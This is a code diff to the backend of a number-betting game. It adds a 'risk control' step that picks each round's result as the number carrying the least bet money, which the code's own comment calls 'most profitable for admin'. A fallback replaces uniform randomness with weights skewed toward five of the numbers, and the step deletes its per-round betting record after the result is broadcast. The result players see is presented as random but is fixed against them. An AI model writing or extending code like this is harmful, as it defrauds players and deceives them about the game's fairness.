@@ -2,6 +2,7 @@ const { NummaRound1m, NummaRound3m, NummaRound5m } = require('../models/NummaRou
 const NummaBet = require('../models/NummaBet');
 const User = require('../models/User');
 const Transaction = require('../models/Transaction');
+const NummaBetOutcome = require('../models/NummaBetOutcome');
 const mongoose = require('mongoose');
 
 class NummaRoundManager {
@@ -136,9 +137,47 @@ class NummaRoundManager {
         return;
       }
       
-      // Generate random result if not manually set
+      // --- Use pre-calculated outcome totals for risk control ---
+      const outcomeDoc = await NummaBetOutcome.findOne({ roundId, duration });
+      let forcedNumber = null;
+      if (outcomeDoc) {
+        // Find the number with the lowest total bets (most profitable for admin)
+        let minTotal = Infinity;
+        let minNumbers = [];
+        for (let i = 0; i < 10; i++) {
+          const key = `number:${i}`;
+          const total = outcomeDoc.outcomeTotals.get(key) || 0;
+          if (total < minTotal) {
+            minTotal = total;
+            minNumbers = [i];
+          } else if (total === minTotal) {
+            minNumbers.push(i);
+          }
+        }
+        // If multiple numbers have the same (lowest) total, pick randomly among them
+        forcedNumber = minNumbers[Math.floor(Math.random() * minNumbers.length)];
+      }
+      // --- End risk control ---
+
+      // Generate result if not manually set
       if (!round.result || !round.result.number) {
-        const randomNumber = Math.floor(Math.random() * 10); // 0-9
+        let randomNumber;
+        if (forcedNumber !== null) {
+          randomNumber = forcedNumber;
+        } else {
+          // fallback to weighted or uniform random
+          const weights = [0.07, 0.07, 0.07, 0.07, 0.07, 0.13, 0.13, 0.13, 0.13, 0.13];
+          function weightedRandom(weights) {
+            let sum = 0;
+            const r = Math.random();
+            for (let i = 0; i < weights.length; i++) {
+              sum += weights[i];
+              if (r < sum) return i;
+            }
+            return weights.length - 1;
+          }
+          randomNumber = weightedRandom(weights);
+        }
         round.setResultFromNumber(randomNumber);
       }
       
@@ -153,6 +192,12 @@ class NummaRoundManager {
       // Broadcast result to clients
       if (global.nummaWebSocketServer) {
         global.nummaWebSocketServer.broadcastResult(round);
+      }
+
+      // Clean up NummaBetOutcome after result is generated
+      if (outcomeDoc) {
+        await NummaBetOutcome.deleteOne({ _id: outcomeDoc._id });
+        console.log(`[DEBUG] Deleted NummaBetOutcome for roundId=${roundId}, duration=${duration}`);
       }
       
     } catch (error) {
@@ -339,6 +384,15 @@ class NummaRoundManager {
     }
   }
 
+  // Helper to get multiplier based on betType and betValue (case-insensitive)
+  getNummaMultiplier(betType, betValue) {
+    const type = (betType || '').toLowerCase();
+    if (type === 'number') return 9;
+    if (type === 'color') return 2;
+    if (type === 'bigsmall') return 2;
+    return 1;
+  }
+
   // Place a bet
   async placeBet(userId, roundId, duration, betType, betValue, amount, multiplier = 1) {
     try {
@@ -408,6 +462,34 @@ class NummaRoundManager {
       
       // Save bet
       await bet.save();
+      
+      // --- Update bet outcome totals in NummaBetOutcome ---
+      let outcomeDoc = await NummaBetOutcome.findOne({ roundId, duration });
+      if (!outcomeDoc) {
+        outcomeDoc = new NummaBetOutcome({ roundId, duration });
+        console.log(`[DEBUG] Created new NummaBetOutcome for roundId=${roundId}, duration=${duration}`);
+      }
+      
+      // Multiply amount * frontend multiplier * backend multiplier
+      const type = (betType || '').toLowerCase();
+      console.log('DEBUG betType received:', betType, 'Normalized:', type);
+      const frontendMultiplier = typeof multiplier !== 'undefined' ? Number(multiplier) : 1;
+      const backendMultiplier = this.getNummaMultiplier(type, betValue);
+      console.log('DEBUG backendMultiplier:', backendMultiplier, 'from getNummaMultiplier(', type, ',', betValue, ')');
+      const outcomeValue = amount * frontendMultiplier * backendMultiplier;
+      console.log('Storing outcome:', {
+        key: `${type}:${betValue}`,
+        amount,
+        frontendMultiplier,
+        backendMultiplier,
+        outcomeValue
+      });
+      
+      const prev = outcomeDoc.outcomeTotals.get(`${type}:${betValue}`) || 0;
+      outcomeDoc.outcomeTotals.set(`${type}:${betValue}`, prev + outcomeValue);
+      outcomeDoc.updatedAt = new Date();
+      await outcomeDoc.save();
+      console.log(`[DEBUG] Updated NummaBetOutcome: roundId=${roundId}, duration=${duration}, key=${type}:${betValue}, total=${prev + outcomeValue}`);
       
       // Update round stats
       round.totalBets += 1;
